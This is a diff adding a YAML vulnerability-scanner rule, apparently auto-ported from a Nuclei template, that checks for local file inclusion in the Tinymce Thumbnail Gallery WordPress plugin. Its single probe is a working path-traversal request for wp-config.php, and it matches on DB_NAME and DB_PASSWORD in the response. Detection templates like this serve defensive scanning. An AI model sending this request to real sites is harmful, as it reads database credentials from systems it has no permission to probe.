@@ -1,0 +1,32 @@
+schema_version: 1
+id: "cortex.community:wp-tinymce-lfi"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "Tinymce Thumbnail Gallery <=1.0.7 - Local File Inclusion"
+  description: "Tinymce Thumbnail Gallery 1.0.7 and before are vulnerable to local file inclusion via download-image.php. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://wpscan.com/vulnerability/4a49b023-c1c9-4cc4-a2fd-af5f911bb400"
+    - "http://wordpress.org/extend/plugins/tinymce-thumbnail-gallery/"
+  cwes: [22]
+  tags: ["wpscan", "wordpress", "wp-theme", "lfi", "tinymce", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - all:
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "DB_NAME" } }
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "DB_PASSWORD" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
